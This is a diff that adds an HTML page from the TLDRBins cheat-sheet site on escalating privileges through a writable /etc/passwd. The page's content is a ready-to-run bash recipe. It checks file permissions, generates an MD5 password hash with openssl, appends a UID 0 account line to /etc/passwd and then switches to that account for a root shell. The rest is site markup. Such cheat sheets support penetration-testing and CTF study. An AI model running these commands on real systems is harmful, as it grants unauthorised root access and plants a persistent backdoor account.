@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Writable /etc/passwd | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/passwd/">
+      <span>Writable /etc/passwd</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@passwd/">Passwd</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@shadow/">Shadow</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@/etc/passwd/">/Etc/Passwd</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">ls -l /etc/passwd /etc/shadow
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create password hash</span>
+</span></span><span class="line"><span class="cl">openssl passwd -1 password
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add to /etc/passwd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Get root shell</span>
+</span></span><span class="line"><span class="cl">su - user
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
